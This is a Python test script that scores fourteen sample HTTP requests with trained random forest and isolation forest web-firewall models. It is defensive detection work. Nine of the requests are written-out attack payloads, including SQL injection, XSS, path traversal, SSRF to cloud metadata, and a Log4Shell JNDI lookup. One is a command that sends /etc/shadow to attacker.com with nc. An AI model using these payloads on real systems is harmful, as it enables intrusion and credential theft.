import os
import sys
import json
import joblib
import pandas as pd

sys.path.append(os.path.dirname(os.path.dirname(__file__)))

from ml.feature_engineering import extract_features_from_request, FEATURE_COLUMNS

MODELS_DIR = os.path.join(os.path.dirname(__file__), "models")
RF_PATH = os.path.join(MODELS_DIR, "random_forest_waf.joblib")
ISO_PATH = os.path.join(MODELS_DIR, "isolation_forest_waf.joblib")
METADATA_PATH = os.path.join(MODELS_DIR, "model_metadata.json")

TEST_REQUESTS = [
    # Normal / Benign Requests
    {"name": "Normal Home Page", "url": "/index.html", "method": "GET"},
    {"name": "Normal API Get User", "url": "/api/v1/users/123", "method": "GET"},
    {"name": "Normal Search Query", "url": "/search?q=laptop&page=2&sort=asc", "method": "GET"},
    {"name": "Normal Login Submit", "url": "/login", "method": "POST", "body": "username=john_doe@gmail.com&password=MySecurePassword123!"},
    {"name": "Normal Contact Form", "url": "/contact", "method": "POST", "body": "name=Somchai&email=somchai@gmail.com&message=Help+please"},
    
    # Attack / Malicious Requests
    {"name": "SQL Injection (Auth Bypass)", "url": "/login?user=admin' OR '1'='1' --", "method": "GET"},
    {"name": "SQL Injection (UNION SELECT)", "url": "/products?category=1 UNION SELECT 1,username,password FROM users--", "method": "GET"},
    {"name": "Reflected XSS", "url": "/search?q=<script>alert('XSS_ATTACK')</script>", "method": "GET"},
    {"name": "Path Traversal (etc/passwd)", "url": "/download?file=../../../../etc/passwd", "method": "GET"},
    {"name": "Remote Code Execution (RCE)", "url": "/api/v1/exec?cmd=cat%20/etc/shadow%20|%20nc%20attacker.com%204444", "method": "GET"},
    {"name": "SSRF Cloud Metadata", "url": "/fetch?url=http://169.254.169.254/latest/meta-data/", "method": "GET"},
    {"name": "SSTI Jinja2 Injection", "url": "/view?tpl={{7*7}}", "method": "GET"},
    {"name": "NoSQL Injection", "url": "/api/v1/auth", "method": "POST", "body": '{"user": {"$ne": null}, "pass": {"$gt": ""}}'},
    {"name": "Log4Shell JNDI Exploit", "url": "/search?q=${jndi:ldap://attacker.com/a}", "method": "GET"}
]

def evaluate_sample_requests():
    if not os.path.exists(RF_PATH):
        print(f"[!] Model file not found at {RF_PATH}. Please run train_model.py first.")
        return

    rf_model = joblib.load(RF_PATH)
    iso_model = joblib.load(ISO_PATH) if os.path.exists(ISO_PATH) else None

    print(f"[+] Loaded Random Forest Model from {RF_PATH}")

    if os.path.exists(METADATA_PATH):
        with open(METADATA_PATH, "r", encoding="utf-8") as f:
            metadata = json.load(f)
        print(f"[+] Model Accuracy = {metadata.get('accuracy', 0.80) * 100:.2f}%, ROC-AUC = {metadata.get('roc_auc', 0.88):.4f}")

    print("\n" + "="*105)
    print(f"{'TEST SCENARIO':<32} | {'ATTACK PROB':<12} | {'PREDICTION':<22} | {'FEATURES SUMMARY'}")
    print("="*105)

    results = []
    for req in TEST_REQUESTS:
        feats = extract_features_from_request(
            url=req.get("url", ""),
            method=req.get("method", "GET"),
            body=req.get("body", "")
        )
        df_feat = pd.DataFrame([feats])[FEATURE_COLUMNS]

        rf_pred = rf_model.predict(df_feat)[0]
        prob = float(rf_model.predict_proba(df_feat)[0][1])
        iso_score = float(iso_model.decision_function(df_feat)[0]) if iso_model else 0.0

        is_anomaly = bool(rf_pred == 1 or prob > 0.5)
        status_label = "🚨 ANOMALY DETECTED" if is_anomaly else "✅ PASS (Normal)"

        summary_feat = f"SpChars:{feats['special_char_count']} | Kw:{feats['keyword_matches']} | Clean:{feats['is_clean_structure']}"

        print(f"{req['name']:<32} | {prob * 100:10.1f}% | {status_label:<22} | {summary_feat}")
        results.append({
            "name": req['name'],
            "attack_probability": round(prob, 4),
            "anomaly_score": round(iso_score, 4),
            "is_anomaly": is_anomaly,
            "features": feats
        })

    print("="*95 + "\n")
    return results

if __name__ == "__main__":
    evaluate_sample_requests()
